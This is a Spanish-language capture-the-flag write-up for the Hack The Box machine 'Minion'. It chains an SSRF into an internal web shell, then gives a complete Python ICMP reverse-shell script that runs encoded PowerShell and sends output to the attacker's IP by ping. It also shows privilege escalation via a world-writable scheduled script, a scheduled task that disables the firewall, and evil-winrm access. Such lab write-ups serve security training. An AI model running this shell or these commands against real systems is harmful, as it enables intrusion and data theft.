---
tags:
title: Minion - Insane (HTB)
permalink: /Minion -HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimiento

```bash
nmap -sCV -p62696 10.129.255.40                                           
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-09 16:16 EST
Stats: 0:00:28 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.32% done; ETC: 16:16 (0:00:00 remaining)
Verbosity Increased to 1.
Completed NSE at 16:16, 12.94s elapsed
Initiating NSE at 16:16
Completed NSE at 16:16, 3.18s elapsed
Initiating NSE at 16:16
Completed NSE at 16:16, 0.00s elapsed
Nmap scan report for 10.129.255.40
Host is up (0.38s latency).

PORT      STATE SERVICE VERSION
62696/tcp open  http    Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Microsoft-IIS/8.5
| http-robots.txt: 1 disallowed entry 
|_/backend
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

NSE: Script Post-scanning.
Initiating NSE at 16:16
Completed NSE at 16:16, 0.00s elapsed
Initiating NSE at 16:16
Completed NSE at 16:16, 0.00s elapsed
Initiating NSE at 16:16
Completed NSE at 16:16, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.60 seconds
           Raw packets sent: 5 (196B) | Rcvd: 3 (112B)
```

## Website / Port 62696

La pagina principal no muestra nada de nada.

![image-center](/assets/images/Pasted image 20251209182113.png)

### Code

En el c칩digo fuente muestra la siguiente cadena en `base64`.

```html
<center>
<h2>Welcome to Minions Fanclub Site!</h2><br>
<center><br>
(site is heavily under construction)<br>
Designed and maintained by Decoder .. ciao from Italy!<br>
Visit my  <a href=https://decoder.cloud>blog</a><br>
Follow me on twitter: @decoder_it
<br><img src=minion.jpg>
<br>
</center>
<!--
TmVsIG1lenpvIGRlbCBjYW1taW4gZGkgbm9zdHJhIHZpdGENCm1pIHJpdHJvdmFpIHBlciB1bmEgc2VsdmEgb3NjdXJhLA0KY2jDqSBsYSBkaXJpdHRhIHZpYSBlcmEgc21hcnJpdGEu
-->
```

Si la codifico quiz치s tenga algo de informaci칩n.

```bash
echo TmVsIG1lenpvIGRlbCBjYW1taW4gZGkgbm9zdHJhIHZpdGENCm1pIHJpdHJvdmFpIHBlciB1bmEgc2VsdmEgb3NjdXJhLA0KY2jDqSBsYSBkaXJpdHRhIHZpYSBlcmEgc21hcnJpdGEu | base64 -d 
Nel mezzo del cammin di nostra vita
mi ritrovai per una selva oscura,
ch칠 la diritta via era smarrita.
```

Nada de nada

## Robots.txt

En el archivo `robots.txt` que me revelo el escaneo de `nmap`, veo una ruta `/backend`.

![image-center](/assets/images/Pasted image 20251209182710.png)

Sin embargo si voy a la misma, me sale el siguiente mensaje en la pagina.

![image-center](/assets/images/Pasted image 20251209182806.png)
## Feroxbuster enumeration

Antes de pasar a la enumeraci칩n de directorios, y dem치s, es de notar que corre un `IIS (Internet Information Service)` con la versi칩n `8.5`.

```bash
curl -s -X GET "http://10.129.255.40:62696" -v
<SNIP>
* Request completely sent off
< HTTP/1.1 200 OK
< Content-Type: text/html
< Last-Modified: Tue, 05 Sep 2017 15:39:06 GMT
< Accept-Ranges: bytes
< ETag: "4cbddf1b5d26d31:0"
< Server: Microsoft-IIS/8.5
< X-Powered-By: ASP.NET
< Date: Tue, 09 Dec 2025 21:25:39 GMT
< Content-Length: 458
<SNIP>
```

Adem치s por detr치s corre `ASP.NET`, por lo que puedo pensar adem치s de `fuzzear` por directorios, tambi칠n por archivos con extensiones como `asp` o `aspx` que corresponder a archivos de `.NET`.

```bash
feroxbuster -u http://10.129.255.40:62696 -x asp,aspx
<SNIP>
301      GET        2l       10w      158c http://10.129.255.40:62696/backend => http://10.129.255.40:62696/backend/
200      GET        1l        7w       41c http://10.129.255.40:62696/test.asp
200      GET      227l      830w    67460c http://10.129.255.40:62696/minion.jpg
200      GET       13l       37w      458c http://10.129.255.40:62696/
200      GET        1l        7w       41c http://10.129.255.40:62696/Test.asp
200      GET        1l        3w       20c http://10.129.255.40:62696/backend/default.asp
[>-------------------] - 32s     7053/180012  11m     found:6       errors:0      
游뚿 Caught ctrl+c 游뚿 saving scan state to ferox-http_10_129_255_40_62696_-1765315726.state ...
[>-------------------] - 32s     7085/180012  11m     found:6       errors:0      
[>-------------------] - 32s     3447/90000   109/s   http://10.129.255.40:62696/ 
[>-------------------] - 29s     3450/90000   121/s   http://10.129.255.40:62696/backend/
```

Despues de el escaneo, veo el archivo `test.asp`.
### SSRF (Server Side Request Forgery).

El contenido de la pagina tiene esto:

![image-center](/assets/images/Pasted image 20251209182833.png)

Como parece que espera el par치metro `u` se lo indico, el cual parece que despu칠s del mismo poder pasarle una `url`, podr칤a montar un servidor en `Python` con el siguiente comando para que desde la url pueda visualizar mis archivos.

```bash
python3 -m http.server 80
```

![image-center](/assets/images/Pasted image 20251209183319.png)

Pero parece que la pagina me da error `500`, por lo que podr칤a ya que me pide una `url` especificar el mismo `localhost` de la maquina.

![image-center](/assets/images/Pasted image 20251209183346.png)

Parece que apuntando al propio localhost de la maquina si que puedo ver cosas, ya que lo que veo seria la pagina que corre en el puerto `80` de la maquina intuyo, ya que siempre el localhost apunta al `index.php` o `index.html` del propio sistema.

Ya desde ac치 lo que me llama la atenci칩n es el link hacia `system commands` el cual apunta a un archivo `cmd.aspx`, pero si clickeo en el me lleva a mi propio localhost.

![image-center](/assets/images/Pasted image 20251209183743.png)
## Command

Para poder tener resoluci칩n puedo usar el mismo `SSRF` para poder ver el archivo.

![image-center](/assets/images/Pasted image 20251209183854.png)

Veo que si ejecuto un comando me da el siguiente error.

![image-center](/assets/images/Pasted image 20251209183918.png)

Ya que apunta a la `ip` de la maquina y a ese archivo el cual externamente no esta expuesto, pero otra vez mas, aprovechando de la vulnerabilidad puedo usar los t칤picos par치metros en archivos de este tipo como `?c`, `?cmd`, `?command`, entre otros, pero en este caso en el c칩digo fuente me indica de que manera puedo ejecutar.

```html
<html>
<body>

<form action="cmd.aspx" method=POST>
<p>Enter your shell command: <input type=text name=xcmd size=40> </form> </body> </html>
```
## Shell as defaultapppool
Veo que el par치metro es `xcmd` por lo que en la misma url puedo indicar algo como esto:

```bash
?xcmd=whoami
```

![image-center](/assets/images/Pasted image 20251209184353.png)
### ICMP Shell

La respuesta es rara, ya que no me muestra el `output`, de los comandos como usualmente en este tipo de shells se ve, sino un c칩digo de esta pareciera ser, probando veo que es cierto, ya que si por ejemplo si coloco el comando `whoam`, obtengo esta respuesta.

![image-center](/assets/images/Pasted image 20251209184551.png)

C칩digo de estado `1` el cual es falso, podr칤a intentar enviarme una shell o descargarme el `nc.exe`.

![image-center](/assets/images/Pasted image 20251209184816.png)

Sin embargo, ni siquiera recibo la solicitud y adem치s el c칩digo de estado es `1` por lo que quiz치s no sea un comando invalido, sino hay algo por detr치s que impide descargar archivos en la maquina. Ahora quiero ver si tengo `ping` hacia mi maquina, lo hago desde `curl` par jugar mas c칩modamente.

```bash
curl -X GET -G 'http://10.129.255.40:62696/test.asp' --data-urlencode 'u=http://127.0.0.1/cmd.aspx?xcmd=ping -n 1 10.10.17.19' 


<html>
<body>
Exit Status=0
<form action="cmd.aspx" method=POST>
<p>Enter your shell command: <input type=text name=xcmd size=40> </form> </body> </html>
```

Y desde mi `tcpdump` a la escucha de peticiones `ECHO ICMP` veo que si tengo peticiones.

```bash
tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
17:14:06.608837 IP  > 10.10.17.19: ICMP echo request, id 1, seq 5, length 40
17:14:06.608887 IP 10.10.17.19 > : ICMP echo reply, id 1, seq 5, length 40
```

Por lo que puedo pensar en que shell por `TCP` no acepta, pero quiz치s por `ICMP` si.
Por lo que me cree un script en `Python` que lo que hace tomando de referencia este [archivo](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1) en `Powershell` para peticiones `ICMP`, que lo que hace es enviar el payload en codificado en `base64` en fragmentos, despu칠s, en la funci칩n `listener()` crea un listener, el cual solo filtra los paquetes `ICMP` 칰nicamente de la ip victima luego recibe las repuestas o peticiones `ICMP` en partes, que luego en la funci칩n `process_packet()`, construye todos los fragmentos devolviendo as칤 el output en la terminal.

{% raw %}
```python
import base64
import requests
from cmd import Cmd
from scapy.all import *
import sys
from urllib.parse import quote
import threading

current_path = "C:\\Windows\\System32"  # Ruta inicial por defecto
shell_payload = """$cmd = '{cmd}'; $ip = New-Object System.Net.NetworkInformation.Ping; $size = 1000; $options = New-Object System.Net.NetworkInformation.PingOptions; $options.DontFragment = $true; $result = (Invoke-Expression -Command $cmd | Out-String); $sendBytes = ([text.encoding]::ASCII).GetBytes($result); $counter = 0 ; while ($counter -lt $sendBytes.Length){{$ip.Send('10.10.17.19', 4000, $sendBytes[$counter..($counter+$size)], $options); $counter += $size;}}"""

# Payload para obtener la ruta actual
get_path_payload = """$ip = New-Object System.Net.NetworkInformation.Ping; $options = New-Object System.Net.NetworkInformation.PingOptions; $options.DontFragment = $true; $path = (Get-Location).Path; $sendBytes = ([text.encoding]::ASCII).GetBytes($path); $ip.Send('10.10.17.19', 4000, $sendBytes, $options)"""

def process_packet(packet):
    global current_path
    if packet.haslayer(Raw):
        try:
            data = packet[Raw].load.decode()
            print(data, end="")
            sys.stdout.flush()
            
            # Si el output parece una ruta, actualizarla
            if data.strip() and '\\' in data and len(data.split('\n')) == 1:
                current_path = data.strip()
        except:
            pass

def listener():
    sniff(filter="icmp and src 10.129.255.40", iface="tun0", prn=process_packet, store=0)

def command(cmd):
    payload = shell_payload.format(cmd=cmd)
    encoded_cmd = base64.b64encode(payload.encode("utf-16le")).decode()
    urlcmd = quote(quote(encoded_cmd))
    requests.get(f"http://10.129.255.40:62696/test.asp?u=http://127.0.0.1/cmd.aspx?xcmd=powershell+-enc+{urlcmd}")

def update_path():
    """Obtiene la ruta actual del sistema remoto"""
    encoded = base64.b64encode(get_path_payload.encode("utf-16le")).decode()
    urlcmd = quote(quote(encoded))
    requests.get(f"http://10.129.255.40:62696/test.asp?u=http://127.0.0.1/cmd.aspx?xcmd=powershell+-enc+{urlcmd}")

if __name__ == '__main__':
    # Iniciar listener en thread
    thread = threading.Thread(target=listener)
    thread.daemon = True
    thread.start()
    
    print("[*] ICMP Shell iniciada")
    print()
    
    # Obtener ruta inicial
    update_path()
    import time
    time.sleep(1)  # Dar tiempo para recibir la ruta
    
    # Loop de comandos
    try:
        while True:
            prompt = f"PS {current_path}> "
            cmd = input(prompt)
            
            if cmd.lower() in ['exit', 'quit']:
                break
            
            if cmd.strip():
                command(cmd)
                # Si es un comando 'cd', actualizar la ruta
                if cmd.strip().lower().startswith('cd '):
                    time.sleep(1)  # Esperar a que se ejecute
                    update_path()
                    time.sleep(0.5)  # Esperar respuesta
                    
    except KeyboardInterrupt:
        print("\n[!] Saliendo")
```
{% endraw %}

Una vez lo ejecuto pasandole la url victima, veo que con exito puedo ejecutar comandos, y la respuesta es vista en el output.

```powershell
python3 script.py 10.10.17.19 10.129.255.40 http://10.129.255.40:62696/test.asp
[*] Local IP:  10.10.17.19
[*] Target IP: 10.129.255.40
[*] SSRF URL:  http://10.129.255.40:62696/test.asp
[*] Interface: tun0
[*] Iniciando listener ICMP...

minion> whoami
iis apppool\defaultapppool
```
## Shell as nt authority\system

Veo que en la ra칤z esta el directorio `sysadmscripts`, dentro del cual est치n los siguientes archivos.

```powershell
minion> dir C:\sysadmscripts


    Directory: C:\sysadmscripts


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---         9/26/2017   6:24 AM        284 c.ps1                             
-a---         8/22/2017  10:46 AM        263 del_logs.bat
```

Analizando el contenido de los dos, veo que en el `.bat` ejecuta con powershell el archivo `c.ps1`.

```powershell
minion> type C:\sysadmscripts\c.ps1
$lifeTime=1; # days

foreach($arg in $args)
{
    write-host $arg

    dir $arg | where {!$_.psiscontainer} | foreach
    {
        if((get-date).subtract($_.LastWriteTime).Days -gt $lifeTime)
        {
            remove-item ($arg + '\' + $_) -force
        }
    }
}
minion> type C:\sysadmscripts\del_logs.bat
@echo off
echo %DATE% %TIME% start job >> c:\windows\temp\log.txt
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden -exec bypass -nop -file c:\sysadmscripts\c.ps1 c:\accesslogs 
echo %DATE% %TIME% stop job >> c:\windows\temp\log.txt
```
## Bad permissions

Viendo los permisos de ese archivo veo que para todos se le asigno `F (FULL) `, de manera que cualquier usuario puede editar el archivo.

```powershell
icacls C:\sysadmscripts\c.ps1
C:\sysadmscripts\c.ps1 NT AUTHORITY\SYSTEM:(F)
                       BUILTIN\Administrators:(F)
                       Everyone:(F)
                       BUILTIN\Users:(F)

Successfully processed 1 files; Failed processing 0 files
```

Como no puedo leer la `flag` que esta en el directorio del usuario `decoder.MINION`, voy a copiar todo lo que haya dentro del directorio de este usuario en la ruta `C:\Temp`.

```powershell
echo "cp C:\Users\decoder.MINION\Desktop\* C:\Temp" > C:\sysadmscripts\c.ps1
```

Es as칤 como despu칠s de unos segundos, los archivos est치n dentro de la ruta que especifique, adem치s perd칤 mucho tiempo tratando de analizar el contenido del `backup` y no tiene nada de nada, por lo que trate de ver las `ADS (Alternate Data Strams)` que los archivos que consegu칤 ten칤an.

>Las **Alternate Data Streams (ADS)**, o Flujos de Datos Alternativos, son una caracter칤stica del sistema de archivos `NTFS` de Windows que permite adjuntar datos adicionales a un archivo de forma oculta, sin que cambie su tama침o visible ni sea detectado por el explorador de archivos com칰n, funcionando como un "archivo dentro de otro archivo", usados para metadatos leg칤timos o para ocultar malware y evadir seguridad

```bash
minion> cmd.exe /c dir /s /r C:\Temp
 Volume in drive C has no label.
 Volume Serial Number is A339-1583

 Directory of C:\Temp

12/09/2025  04:36 PM    <DIR>          .
12/09/2025  04:36 PM    <DIR>          ..
09/04/2017  06:19 PM           103,297 backup.zip
                                    34 backup.zip:pass:$DATA
08/25/2017  10:09 AM                33 user.txt
              3 File(s)        139,274 bytes

     Total Files Listed:
               3 File(s)        139,274 bytes
               2 Dir(s)   4,503,072,768 bytes free
```

Para ver el contenido real del archivo use el siguiente comando

```powershell
minion> type C:\Temp\backup.zip:pass
28a5d1e0c15af9f8fce7db65d75bbf17
```
 Fui a crackstation para romperlo lo que me dio la siguiente pass
 
![image-center](/assets/images/Pasted image 20251209213743.png)
## Scheduled task

Como vi que hab칤an muchos puertos abiertos localmente, quise intentar abrirlos, ya que las credenciales eran validas para el usuario `Administrator`.

```powershell
minion> netstat -ano 

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       580
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       1536
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       392
  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       752
  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       788
  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       576
  TCP    0.0.0.0:49156          0.0.0.0:0              LISTENING       488
  TCP    0.0.0.0:49157          0.0.0.0:0              LISTENING       4496
  TCP    0.0.0.0:62696          0.0.0.0:0              LISTENING       4
  TCP    10.129.255.40:139      0.0.0.0:0              LISTENING       4
  TCP    10.129.255.40:62696    10.10.17.19:55162      ESTABLISHED     4
  TCP    127.0.0.1:80           127.0.0.1:49215        ESTABLISHED     4
  TCP    127.0.0.1:49215        127.0.0.1:80           ESTABLISHED     1672
  TCP    [::]:80                [::]:0                 LISTENING       4
  TCP    [::]:135               [::]:0                 LISTENING       580
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:3389              [::]:0                 LISTENING       1536
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49152             [::]:0                 LISTENING       392
  TCP    [::]:49153             [::]:0                 LISTENING       752
  TCP    [::]:49154              [::]:0                 LISTENING       788
  TCP    [::]:49155             [::]:0                 LISTENING       576
  TCP    [::]:49156             [::]:0                 LISTENING       488
  TCP    [::]:49157             [::]:0                 LISTENING       496
  TCP    [::]:62696             [::]:0                 LISTENING       4
```

Intente usar las mismas con `PSCredentials` usando `Scripts Blocks`, pero no sirvi칩, ya que mi idea era deshabilitar el Firewall de la maquina para que cuando haga el escaneo TCP, me detecte los puertos como el del servicio `WinRM`, o `psexec`, para eso acud칤 a las tareas programas que en Windows se conocen como `Scheduled Tasks`, como primero quiero hacer una prueba para ver si funciona necesito de la herramienta `schtasks`, para crear una tarea use el siguiente comando.

```powershell
minion> schtasks /create /tn "RunCmd" /tr "cmd /c whoami > C:\Temp\result.txt" /sc once /st 00:00 /ru minion\Administrator /rp 1234test /f

SUCCESS: The scheduled task "RunCmd" has successfully been created.
```

Ahora para correrla uso el par치metro `/run`.

```powershell
minion> schtasks /run /tn "RunCmd"
SUCCESS: Attempted to run the scheduled task "RunCmd".
```

Y verifico que el output de mi comando se haya creado en el archivo, y si.

```powershell
minion> type C:\Temp\result.txt
minion\administrator
```
## Disable firewall

Para deshabilitar el firewall use el siguiente comando, bas치ndome en la documentaci칩n de [Microsoft](https://learn.microsoft.com/en-us/windows/security/operating-system-security/network-security/windows-firewall/configure-with-command-line?tabs=cmd)

```powershell
minion> schtasks /create /tn "DisableFW" /tr "netsh advfirewall set allprofiles state off" /sc once /st 00:00 /ru minion\Administrator /rp 1234test /f
SUCCESS: The scheduled task "DisableFW" has successfully been created.
minion> schtasks /run /tn "DisableFW"
SUCCESS: Attempted to run the scheduled task "DisableFW".
```

Y ahora si hago el escaneo todos los puertos quedan abiertos.

```bash
nmap -sS --open -n --min-rate 5000 -p- 10.129.255.40 -vv -oG nmap_scan
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-09 20:32 EST
Initiating Ping Scan at 20:32
Scanning 10.129.255.40 [4 ports]
Completed Ping Scan at 20:32, 0.38s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 20:32
Scanning 10.129.255.40 [65535 ports]
Discovered open port 135/tcp on 10.129.255.40
Discovered open port 3389/tcp on 10.129.255.40
Discovered open port 139/tcp on 10.129.255.40
Discovered open port 80/tcp on 10.129.255.40
Discovered open port 445/tcp on 10.129.255.40
Discovered open port 49156/tcp on 10.129.255.40
Discovered open port 49157/tcp on 10.129.255.40
Discovered open port 49156/tcp on 10.129.255.40
Discovered open port 49234/tcp on 10.129.255.40
Discovered open port 49154/tcp on 10.129.255.40
Discovered open port 49155/tcp on 10.129.255.40
Discovered open port 62696/tcp on 10.129.255.40
Discovered open port 49152/tcp on 10.129.255.40
Discovered open port 49152/tcp on 10.129.255.40
Discovered open port 47001/tcp on 10.129.255.40
Discovered open port 49153/tcp on 10.129.255.40
Discovered open port 47001/tcp on 10.129.255.40
Discovered open port 5985/tcp on 10.129.255.40
Discovered open port 5985/tcp on 10.129.255.40
```

Por lo que ahora puedo conectarme v칤a `WinRM`, usando las credenciales del usuario `Administrator`.

```powershell
evil-winrm -i 10.129.255.40 -u Administrator -p 1234test              
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                     
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../desktop
*Evil-WinRM* PS C:\Users\Administrator\desktop> .\root.exe
25afc18b756db15085428015928a1cf1
```

`~Happy Hacking.`